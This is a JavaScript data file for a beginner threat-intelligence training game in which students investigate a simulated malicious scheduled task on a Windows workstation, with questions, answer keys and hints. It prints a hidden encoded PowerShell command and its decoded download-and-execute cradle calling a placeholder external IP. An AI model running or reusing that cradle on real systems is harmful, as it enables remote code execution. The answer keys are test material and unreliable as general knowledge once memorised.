/* CTI Casefile — Scenario definition
 * Pure data. Loaded as a classic script so the app also works from file://
 * (fetch() of JSON would be blocked by CORS on a local disk).
 *
 * Source of truth for content: ../scenario.md (beginner-suspicious-schtask-001)
 */
(function () {
  window.CTI_SCENARIOS = window.CTI_SCENARIOS || [];

  window.CTI_SCENARIOS.push({
    id: 'beginner-suspicious-schtask-001',
    title: 'Find the Persistence',
    difficulty: 'Beginner',
    seed: 105,
    caseRef: 'CASE 001',
    host: 'sec-win-07',
    host_ip: '10.0.4.22',

    mission: {
      brief: 'Investigate workstation sec-win-07.',
      objective: 'Determine whether the activity on this workstation represents malicious persistence.',
      client: 'Internal Security Operations — Tier 1 Escalation Desk'
    },

    narrative:
      "An attacker who gained a foothold on a workstation created a scheduled task named 'WindowsUpdateCheck' " +
      'that runs every 15 minutes and executes PowerShell with an encoded command. Each execution calls back to ' +
      'an external IP. The persistence is obvious once the scheduled task event is found: the task name mimics a ' +
      'legitimate Windows component, but it runs PowerShell with an encoded argument and produces recurring ' +
      'external connections.',

    /* ---------------------------------------------------------------
     * STAGE 2 — TRIAGE
     * The student tags each event as signal / context / noise.
     * tags: 'signal' | 'context' | 'noise'
     * --------------------------------------------------------------- */
    events: [
      {
        id: 'ev-4624-rneuman',
        ts: '08:01:12',
        code: 4624,
        kind: 'event',
        host: 'sec-win-07',
        actor: 'rneuman',
        text: 'Successful interactive logon. Source 203.0.113.45 (remote). Logon type 10.',
        tags: 'context',
        why:
          'This is the foothold — the interactive entry point, not the malicious behavior itself. You need it to ' +
          'anchor the timeline, but a single remote logon is not evidence of persistence.'
      },
      {
        id: 'ev-4698-task',
        ts: '08:04:31',
        code: 4698,
        kind: 'event',
        host: 'sec-win-07',
        actor: 'rneuman',
        text: "Scheduled task created: 'WindowsUpdateCheck'. Trigger: every 15 minutes. Action: powershell.exe -nop -w hidden -enc <base64>. Run as: rneuman.",
        tags: 'signal',
        why:
          'A user-writable scheduled task is a persistence mechanism. This is the highest-value event in the ' +
          'stream: it names the artifact, its creator, its cadence and its payload all in one record.'
      },
      {
        id: 'ev-4688-ps1',
        ts: '08:06:07',
        code: 4688,
        kind: 'event',
        host: 'sec-win-07',
        actor: 'SYSTEM',
        text: "Process created. powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZWN0... Parent: svchost.exe (Task Scheduler).",
        tags: 'signal',
        why:
          'Task Scheduler spawning PowerShell is not normal workstation activity. -nop -w hidden are ' +
          'anti-forensic switches and -enc exists to defeat command-line logging.'
      },
      {
        id: 'ev-net-1',
        ts: '08:06:09',
        code: 'NET',
        kind: 'net',
        host: 'sec-win-07',
        text: 'Outbound HTTPS 10.0.4.22:49812 -> 198.51.100.42:443 (412 bytes out)',
        tags: 'signal',
        why:
          'Process creation followed two seconds later by outbound traffic to an external address is the ' +
          'execution-to-callback link. One connection alone is weak; the repetition is what makes it meaningful.'
      },
      {
        id: 'ev-4688-ps2',
        ts: '08:21:07',
        code: 4688,
        kind: 'event',
        host: 'sec-win-07',
        actor: 'SYSTEM',
        text: "Process created. powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZWN0... Parent: svchost.exe (Task Scheduler).",
        tags: 'signal',
        why: 'Second recurrence at the exact 15-minute interval. Repetition is what separates a task from a one-off.'
      },
      {
        id: 'ev-net-2',
        ts: '08:21:09',
        code: 'NET',
        kind: 'net',
        host: 'sec-win-07',
        text: 'Outbound HTTPS 10.0.4.22:49844 -> 198.51.100.42:443 (398 bytes out)',
        tags: 'signal',
        why: 'Second callback to the same external host, again 2 seconds after execution.'
      },
      {
        id: 'ev-4688-ps3',
        ts: '08:36:07',
        code: 4688,
        kind: 'event',
        host: 'sec-win-07',
        actor: 'SYSTEM',
        text: "Process created. powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZWN0... Parent: svchost.exe (Task Scheduler).",
        tags: 'signal',
        why: 'Third recurrence. Three identical executions plus three identical callbacks is a pattern, not coincidence.'
      },
      {
        id: 'ev-net-3',
        ts: '08:36:09',
        code: 'NET',
        kind: 'net',
        host: 'sec-win-07',
        text: 'Outbound HTTPS 10.0.4.22:49901 -> 198.51.100.42:443 (1,204 bytes out)',
        tags: 'signal',
        why:
          'Third callback, and the largest of the three. Payload sizes of roughly 400 bytes look like a check-in ' +
          'or task fetch; the larger response-sized transfer looks like the payload arriving.'
      },

      /* ---------- noise: baseline user activity ---------- */
      { id: 'ev-n01', ts: '08:00:51', code: 4624, kind: 'event', host: 'FIN-WS-14', actor: 'jdoe', text: 'Successful logon. Logon type 2. Source 10.0.4.10.', tags: 'noise' },
      { id: 'ev-n02', ts: '08:02:03', code: 4634, kind: 'event', host: 'FIN-WS-14', actor: 'jdoe', text: 'Logoff. Session closed.', tags: 'noise' },
      { id: 'ev-n03', ts: '08:02:40', code: 4624, kind: 'event', host: 'HR-LT-03', actor: 'asmith', text: 'Successful logon. Logon type 2. Source 10.0.4.11.', tags: 'noise' },
      { id: 'ev-n04', ts: '08:03:18', code: 4672, kind: 'event', host: 'HR-LT-03', actor: 'asmith', text: 'Special privileges assigned to new logon.', tags: 'noise' },
      { id: 'ev-n05', ts: '08:05:55', code: 4624, kind: 'event', host: 'ENG-WS-02', actor: 'mchen', text: 'Successful logon. Logon type 2. Source 10.0.4.10.', tags: 'noise' },
      { id: 'ev-n06', ts: '08:07:44', code: 4624, kind: 'event', host: 'OPS-WS-09', actor: 'kpatel', text: 'Successful logon. Logon type 2. Source 10.0.4.20.', tags: 'noise' },
      { id: 'ev-n07', ts: '08:09:12', code: 4634, kind: 'event', host: 'HR-LT-03', actor: 'asmith', text: 'Logoff. Session closed.', tags: 'noise' },
      { id: 'ev-n08', ts: '08:11:26', code: 4672, kind: 'event', host: 'ENG-WS-02', actor: 'mchen', text: 'Special privileges assigned to new logon.', tags: 'noise' },
      { id: 'ev-n09', ts: '08:13:02', code: 4624, kind: 'event', host: 'ENG-WS-02', actor: 'mchen', text: 'Successful logon (second session). Logon type 2.', tags: 'noise' },
      { id: 'ev-n10', ts: '08:14:37', code: 4634, kind: 'event', host: 'OPS-WS-09', actor: 'kpatel', text: 'Logoff. Session closed.', tags: 'noise' },
      { id: 'ev-n11', ts: '08:16:50', code: 4624, kind: 'event', host: 'FIN-LT-11', actor: 'svega', text: 'Successful logon. Logon type 2. Source 10.0.4.11.', tags: 'noise' },
      { id: 'ev-n12', ts: '08:19:08', code: 4672, kind: 'event', host: 'FIN-LT-11', actor: 'svega', text: 'Special privileges assigned to new logon.', tags: 'noise' },
      { id: 'ev-n13', ts: '08:22:41', code: 4624, kind: 'event', host: 'HR-LT-03', actor: 'asmith', text: 'Successful logon. Logon type 2. Source 10.0.4.11.', tags: 'noise' },
      { id: 'ev-n14', ts: '08:25:15', code: 4634, kind: 'event', host: 'ENG-WS-02', actor: 'mchen', text: 'Logoff. Session closed.', tags: 'noise' },
      { id: 'ev-n15', ts: '08:28:30', code: 4624, kind: 'event', host: 'OPS-WS-09', actor: 'kpatel', text: 'Successful logon. Logon type 2. Source 10.0.4.20.', tags: 'noise' },
      { id: 'ev-n16', ts: '08:31:02', code: 4624, kind: 'event', host: 'FIN-LT-11', actor: 'svega', text: 'Successful logon. Logon type 2. Source 10.0.4.11.', tags: 'noise' },
      { id: 'ev-n17', ts: '08:33:19', code: 4672, kind: 'event', host: 'OPS-WS-09', actor: 'kpatel', text: 'Special privileges assigned to new logon.', tags: 'noise' },
      { id: 'ev-n18', ts: '08:37:44', code: 4634, kind: 'event', host: 'FIN-LT-11', actor: 'svega', text: 'Logoff. Session closed.', tags: 'noise' },
      { id: 'ev-n19', ts: '08:40:06', code: 4624, kind: 'event', host: 'HR-LT-03', actor: 'asmith', text: 'Successful logon. Logon type 2. Source 10.0.4.11.', tags: 'noise' },
      { id: 'ev-n20', ts: '08:42:55', code: 4634, kind: 'event', host: 'OPS-WS-09', actor: 'kpatel', text: 'Logoff. Session closed.', tags: 'noise' }
    ],

    /* ---------------------------------------------------------------
     * STAGE 1 — EVIDENCE INBOX
     * --------------------------------------------------------------- */
    evidence: [
      {
        id: 'al-4698',
        ref: 'ALERT-01',
        severity: 'medium',
        title: 'Scheduled task created by non-administrator',
        blurb: "User 'rneuman' created scheduled task 'WindowsUpdateCheck' on sec-win-07 (Event 4698).",
        detail:
          'Security Event 4698 — "A new task has been registered". Fields of interest: TaskName, TaskContent ' +
          '(the command), the SubjectUserName that created it, and the Trigger node that defines cadence.',
        hint: 'Ask: who created it, what does it execute, and does the task behavior match its name?'
      },
      {
        id: 'al-4688',
        ref: 'ALERT-02',
        severity: 'high',
        title: 'Scheduled task executes PowerShell with encoded command',
        blurb: "The scheduled task launches powershell.exe with -EncodedCommand arguments on each execution.",
        detail:
          'Security Event 4688 — "A new process has been created". The ParentProcess is svchost.exe running as ' +
          'SYSTEM because the Task Scheduler service launched it. -EncodedCommand base64-encodes the script so ' +
          'the real command does not appear in plain text in the command line.',
        hint: 'Ask: why would someone hide the command line from the log they know is being recorded?'
      },
      {
        id: 'al-net',
        ref: 'ALERT-03',
        severity: 'high',
        title: 'Recurring outbound connections from scheduled task',
        blurb:
          'Three outbound HTTPS connections from 10.0.4.22 to 198.51.100.42 within 15 minutes, matching the ' +
          'scheduled task execution interval.',
        detail:
          '198.51.100.42 is in a documentation-reserved range and has no internal business relationship with ' +
          'this host. The cadence matches the task trigger exactly — that alignment is the correlation.',
        hint: 'Ask: does the connection interval match anything you have already seen?'
      },
      {
        id: 'ev-user',
        ref: 'EVID-04',
        severity: 'info',
        title: 'Account information — rneuman',
        blurb: 'Directory record for the account that created the task.',
        detail:
          'rneuman — R. Neuman, Helpdesk Analyst. Group membership: Domain Users, Remote Desktop Users. ' +
          'NOT a member of the local Administrators group. Last password change 41 days ago.',
        hint: 'Ask: does this account have a legitimate reason to create recurring tasks on a workstation?'
      },
      {
        id: 'ev-baseline',
        ref: 'EVID-05',
        severity: 'info',
        title: 'Baseline activity — other hosts this hour',
        blurb: 'Reference traffic for the estate during the same window.',
        detail:
          'In this hour, 5 baseline users generated 20 logon/logoff/privilege events across FIN-WS-14, HR-LT-03, ' +
          'ENG-WS-02, OPS-WS-09 and FIN-LT-11. None created a scheduled task. None ran encoded PowerShell. ' +
          'No other host contacted 198.51.100.42.',
        hint: 'Ask: is this task unique to sec-win-07, or is it something the estate does routinely?'
      }
    ],

    alerts: [
      { name: 'Scheduled task created by non-administrator', severity: 'medium' },
      { name: 'Scheduled task executes PowerShell with encoded command', severity: 'high' },
      { name: 'Recurring outbound connections from scheduled task', severity: 'high' }
    ],

    /* ---------------------------------------------------------------
     * STAGE 3 — TIMELINE
     * --------------------------------------------------------------- */
    timeline: [
      { t: 'T+0', ts: '08:01:12', label: 'Logon', detail: "1 successful logon for 'rneuman' on sec-win-07 from 203.0.113.45 (foothold session)", net: null },
      { t: 'T+3', ts: '08:04:31', label: 'Task', detail: "scheduled_task_registered (4698): 'WindowsUpdateCheck' created on sec-win-07 by 'rneuman'", net: null },
      { t: 'T+5', ts: '08:06:07', label: 'PowerShell', detail: 'process_created (4688): powershell.exe with -EncodedCommand spawned by Task Scheduler', net: '198.51.100.42:443' },
      { t: 'T+20', ts: '08:21:07', label: 'PowerShell', detail: 'process_created (4688): powershell.exe with -EncodedCommand spawned by Task Scheduler', net: '198.51.100.42:443' },
      { t: 'T+35', ts: '08:36:07', label: 'PowerShell', detail: 'process_created (4688): powershell.exe with -EncodedCommand spawned by Task Scheduler', net: '198.51.100.42:443' }
    ],

    timelineQuestion: {
      id: 'q-timeline',
      prompt: 'What pattern do you see in this sequence?',
      options: [
        { id: 'a', label: 'Random administrative activity by several users' },
        { id: 'b', label: 'A one-time execution that did not repeat' },
        { id: 'c', label: 'Recurring execution on a fixed interval, each execution producing external communication' },
        { id: 'd', label: 'Multiple unrelated accounts logging into the same host' }
      ],
      correct: ['c'],
      xp: 10,
      explain:
        'Three executions at a fixed 15-minute interval, each followed two seconds later by a connection to the ' +
        'same external address. Fixed cadence plus repeatable callback is the signature of a task-driven implant, ' +
        'not administrative work.'
    },

    /* ---------------------------------------------------------------
     * STAGE 4 — CORRELATION BOARD
     * --------------------------------------------------------------- */
    boardNodes: [
      { id: 'n-user', label: 'rneuman', sub: 'account', x: 8, y: 8 },
      { id: 'n-host', label: 'sec-win-07', sub: 'host', x: 8, y: 42 },
      { id: 'n-task', label: 'WindowsUpdateCheck', sub: 'scheduled task', x: 40, y: 4 },
      { id: 'n-ps', label: 'PowerShell', sub: 'process', x: 72, y: 4 },
      { id: 'n-enc', label: '-EncodedCommand', sub: 'argument', x: 72, y: 34 },
      { id: 'n-int', label: '15 minutes', sub: 'interval', x: 40, y: 74 },
      { id: 'n-ip', label: '198.51.100.42', sub: 'external IP', x: 8, y: 76 }
    ],
    boardLinks: [
      { from: 'n-user', to: 'n-task', label: 'created', correct: true },
      { from: 'n-task', to: 'n-ps', label: 'launches', correct: true },
      { from: 'n-ps', to: 'n-enc', label: 'uses', correct: true },
      { from: 'n-host', to: 'n-ip', label: 'connects to', correct: true },
      { from: 'n-int', to: 'n-task', label: 'corresponds to', correct: true },
      { from: 'n-user', to: 'n-host', label: 'logged in to', correct: true },
      { from: 'n-host', to: 'n-task', label: 'hosts', correct: false },
      { from: 'n-ip', to: 'n-user', label: 'authenticates', correct: false }
    ],
    boardXp: 10,

    /* ---------------------------------------------------------------
     * STAGE 5 — ANALYSIS: behaviour, ATT&CK, IoCs
     * --------------------------------------------------------------- */
    behaviourQuestions: [
      {
        id: 'q-persist',
        prompt: 'How would you classify the scheduled task itself?',
        options: [
          { id: 'a', label: 'Persistence — recurring execution that survives the user session ending' },
          { id: 'b', label: 'Reconnaissance — gathering information about the host' },
          { id: 'c', label: 'Impact — destructive action against data' },
          { id: 'd', label: 'Benign administration — scheduled maintenance' }
        ],
        correct: ['a'],
        xp: 10,
        explain:
          'Persistence is about surviving: the attacker does not need to be present when the payload runs. A ' +
          'scheduled task re-establishes execution every 15 minutes regardless of whether anyone is logged in.'
      },
      {
        id: 'q-ps',
        prompt: 'What is the significance of PowerShell running with -EncodedCommand?',
        options: [
          { id: 'a', label: 'It is the standard way Windows runs updates' },
          { id: 'b', label: 'It hides the real command from plain-text command-line logging' },
          { id: 'c', label: 'It makes the script run faster' },
          { id: 'd', label: 'It encrypts the network traffic' }
        ],
        correct: ['b'],
        xp: 10,
        explain:
          '-EncodedCommand base64-encodes the script body. Base64 is not encryption, but it defeats the plain-text ' +
          'command line that defenders and EDR products read. Paired with -nop -w hidden it also suppresses ' +
          'profile loading and the console window. The intent is to reduce what the host records.'
      }
    ],

    decodedCommand: {
      encoded: 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC40Mi9hLnBzMScp',
      decoded: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/a.ps1')",
      note:
        'Decoding turns the mystery payload into a plain fact: download a remote script and execute it in memory. ' +
        'That is why the host reaches out to 198.51.100.42 every time the task fires.'
    },

    attack: {
      prompt: 'Which technique best explains this activity?',
      primary: {
        options: [
          { id: 'a', label: 'Scheduled Task/Job', meta: 'T1053.005 · Persistence' },
          { id: 'b', label: 'Command and Scripting Interpreter', meta: 'T1059.001 · Execution' },
          { id: 'c', label: 'Network Service Scanning', meta: 'T1046 · Discovery' },
          { id: 'd', label: 'Valid Accounts', meta: 'T1078 · Defense Evasion / Persistence' }
        ],
        correct: ['a'],
        xp: 10,
        explain:
          'The defining artifact of this case is the recurring user-mode task. PowerShell is the payload, not the ' +
          'persistence mechanism — T1059.001 is genuinely present, but T1053.005 is the technique that explains why ' +
          'the activity keeps happening after the attacker has gone.'
      },
      alsoPresent: {
        prompt: 'Two other techniques are genuinely present in this activity. Select both.',
        options: [
          { id: 'a', label: 'Command and Scripting Interpreter: PowerShell', meta: 'T1059.001' },
          { id: 'b', label: 'Application Layer Protocol: Web Protocols', meta: 'T1071.001' },
          { id: 'c', label: 'Remote Services', meta: 'T1021' },
          { id: 'd', label: 'Data Encrypted for Impact', meta: 'T1486' }
        ],
        correct: ['a', 'b'],
        xp: 10,
        explain:
          'T1059.001 — PowerShell is used to run the payload. T1071.001 — the callback rides inside ordinary ' +
          'HTTPS on port 443, which is why it blends with normal web traffic. Neither of these is persistence on ' +
          'its own; the scheduled task is.'
      }
    },

    iocs: {
      prompt: 'Which of these would you preserve as indicators or investigative pivots?',
      options: [
        { id: 'i1', label: '198.51.100.42', role: 'indicator' },
        { id: 'i2', label: 'WindowsUpdateCheck', role: 'indicator' },
        { id: 'i3', label: 'sec-win-07', role: 'context' },
        { id: 'i4', label: 'PowerShell', role: 'behaviour' },
        { id: 'i5', label: '15 minutes', role: 'behaviour' },
        { id: 'i6', label: 'rneuman', role: 'context' },
        { id: 'i7', label: 'Event 4698', role: 'context' },
        { id: 'i8', label: '-EncodedCommand', role: 'behaviour' }
      ],
      correct: ['indicator', 'behaviour', 'context'],
      xp: 10,
      explain:
        'A real intelligence product is not a list of everything you saw. Only two of these eight items are things ' +
        'you could push to a blocklist or a detection rule: 198.51.100.42 (network indicator) and ' +
        'WindowsUpdateCheck (host-based artifact). PowerShell, the 15-minute interval and -EncodedCommand are ' +
        'behaviours — you write detections around the pattern, not the string. sec-win-07, rneuman and Event 4698 ' +
        'are context: they scope the incident and drive pivots, but they are not indicators of compromise.'
    },

    /* ---------------------------------------------------------------
     * STAGE 6 — REPORT
     * --------------------------------------------------------------- */
    report: {
      host: {
        prompt: 'Which host is compromised?',
        options: [
          { id: 'a', label: 'sec-win-07' },
          { id: 'b', label: 'FIN-WS-14' },
          { id: 'c', label: 'ENG-WS-02' },
          { id: 'd', label: '10.0.4.11' }
        ],
        correct: ['a'],
        xp: 10
      },
      what: {
        prompt: 'What happened?',
        options: [
          { id: 'a', label: 'An attacker established persistence on a compromised workstation using a scheduled task that repeatedly executed encoded PowerShell and called out to an external host.' },
          { id: 'b', label: 'Several users ran administrative scripts on multiple workstations at the same time.' },
          { id: 'c', label: 'A Windows update mechanism was misconfigured and created a duplicate task.' },
          { id: 'd', label: 'The workstation was scanned from 203.0.113.45 and no further activity was observed.' }
        ],
        correct: ['a'],
        xp: 10
      },
      why: {
        prompt: 'Why is it suspicious? Select every reason that holds.',
        options: [
          { id: 'a', label: 'The task name mimics a legitimate Windows component' },
          { id: 'b', label: 'It was created by an account that is not a local administrator' },
          { id: 'c', label: 'It executes PowerShell with an encoded argument' },
          { id: 'd', label: 'It produces recurring outbound connections at the task interval' },
          { id: 'e', label: 'It uses HTTPS, which is always malicious' },
          { id: 'f', label: 'It deletes log files after running' }
        ],
        correct: ['a', 'b', 'c', 'd'],
        xp: 10
      },
      confidence: {
        prompt: 'Analyst confidence in this assessment',
        options: [
          { id: 'a', label: 'Low' },
          { id: 'b', label: 'Medium' },
          { id: 'c', label: 'High' }
        ],
        correct: ['c'],
        xp: 10
      },
      actions: {
        prompt: 'Recommended next actions. Select the three that follow from this assessment.',
        options: [
          { id: 'a', label: 'Block outbound traffic to 198.51.100.42 at the perimeter' },
          { id: 'b', label: 'Delete the WindowsUpdateCheck task and preserve it as forensic evidence first' },
          { id: 'c', label: 'Reset the rneuman credentials and revoke active sessions' },
          { id: 'd', label: 'Hunt the estate for other scheduled tasks named WindowsUpdateCheck' },
          { id: 'e', label: 'Reinstall every workstation in the finance department as a precaution' },
          { id: 'f', label: 'Disable PowerShell across the estate permanently' }
        ],
        correct: ['a', 'b', 'c'],
        xp: 10
      }
    },

    reasoning: {
      prompt: 'Which three pieces of evidence most strongly support your assessment? Select exactly three.',
      options: [
        { id: 'r1', label: "Scheduled task 'WindowsUpdateCheck' created by rneuman (4698)", key: true },
        { id: 'r2', label: 'PowerShell executed with -EncodedCommand by Task Scheduler (4688)', key: true },
        { id: 'r3', label: 'Three outbound connections to 198.51.100.42 at the task interval', key: true },
        { id: 'r4', label: 'Baseline users logged on and off during the same hour', key: false },
        { id: 'r5', label: 'Event 4698 is a Windows audit record', key: false },
        { id: 'r6', label: 'The connection used port 443', key: false },
        { id: 'r7', label: 'Five baseline users were active on the estate', key: false }
      ],
      correctCount: 3,
      xp: 10,
      explain:
        'A single PowerShell execution could be an admin script. A scheduled task alone could be legitimate ' +
        'patching. Recurring encoded PowerShell coupled with periodic communication to the same external host is ' +
        'what makes this defensible: three independent artifacts, each consistent with the others, none of them ' +
        'explainable by routine business as-is.'
    },

    ground_truth: {
      scheduled_tasks_created: 1,
      scheduled_task_name: 'WindowsUpdateCheck',
      powershell_encoded_executions: 3,
      'outbound_connections_to_198.51.100.42': 3,
      compromised_host: 'sec-win-07',
      event_ids_present: [4624, 4688, 4698]
    },

    ranking: [
      { min: 90, rank: 'Lead Intelligence Analyst', note: 'You produced defensible intelligence, not just correct answers.' },
      { min: 75, rank: 'Threat Intelligence Analyst', note: 'Strong correlation and a defensible judgment.' },
      { min: 55, rank: 'Junior CTI Investigator', note: 'You found the behavior and explained it. Tighten the correlation and the reporting.' },
      { min: 0, rank: 'Case Officer Trainee', note: 'Re-run the case. Start with Event 4698 and work outward from there.' }
    ],

    assist: {
      nudge: { label: 'Nudge', mult: 0.85, text: 'Look at the timestamps. Three of them are exactly fifteen minutes apart.' },
      hint: { label: 'Analyst Hint', mult: 0.7, text: 'One record tells you the creator, the name, the cadence and the payload at the same time. Which event ID is it?' },
      explain: { label: 'Explain', mult: 0.5, text: 'Event 4698 records task registration. A user-created task that fires on a timer is a persistence mechanism — the attacker does not need to return. The -EncodedCommand PowerShell it launches and the HTTPS callback that follows each execution are the payload. Together: Task Scheduler / Job, T1053.005.' }
    }
  });
})();